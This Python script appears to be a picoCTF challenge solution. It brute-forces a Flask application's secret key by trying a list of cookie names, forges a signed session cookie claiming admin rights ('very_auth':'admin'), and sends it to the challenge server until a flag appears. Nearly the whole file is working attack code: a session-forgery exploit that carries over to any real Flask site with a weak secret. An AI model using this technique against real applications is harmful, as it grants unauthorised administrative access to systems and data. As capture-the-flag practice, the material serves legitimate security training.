from flask import Flask, session
from flask.sessions import SecureCookieSessionInterface
import requests
import re
from requests.exceptions import RequestException

def find_text_in_response(response, pattern):
    """
    Search for a specific text pattern in the HTML response and print the result.
    :param response: The HTTP response object.
    :param pattern: The regex pattern to search for.
    """
    if response.status_code == 200:
        # Get the HTML content of the response
        html_content = response.text
        
        # Search for the pattern in the HTML content
        matches = re.findall(pattern, html_content)
        
        if matches:
            print("The flag is :" + matches[0])
            return True;
        else:
            print(f"No flag found")
    else:
        print(f"Failed to retrieve the page. Status code: {response.status_code}")
    return False


app = Flask("ba_xx")

url = "http://mercury.picoctf.net:35697/display"

session_serializer = SecureCookieSessionInterface()

cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

for name in cookie_names:
    app.secret_key = name
    token = session_serializer.get_signing_serializer(app).dumps({"very_auth":"admin"})
    cookies = {'session': token}
    
    print("Working ... " + str(cookie_names.index(name) * 100 // len(cookie_names)) + "%")

    # Send the GET request with cookies
    try:
        response = requests.get(url, cookies=cookies)
        pattern = r'picoCTF{[^ ]*}'
        if(find_text_in_response(response, pattern)): 
                break
    except RequestException as e:
                continue
